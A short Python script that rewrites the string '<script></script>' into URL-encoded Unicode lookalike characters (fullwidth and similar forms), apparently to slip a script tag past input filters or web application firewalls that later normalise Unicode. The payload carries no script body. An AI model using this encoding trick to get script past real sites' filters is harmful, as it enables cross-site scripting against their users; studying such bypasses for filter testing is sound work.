data = {
    ord("s"): "%ef%bd%93",
    ord("<"): "%ef%b9%a4",
    ord(">"): "%ef%b9%a5",
    ord("r"): "%ef%bd%92",
    ord("i"): "%e1%b5%a2",
    ord("p"): "%ef%bd%90",
    ord("t"): "%ef%bd%94",
    ord("/"): "%ef%bc%8f",
}

payload = "<script></script>"
transformed = ""

print (payload.translate(data))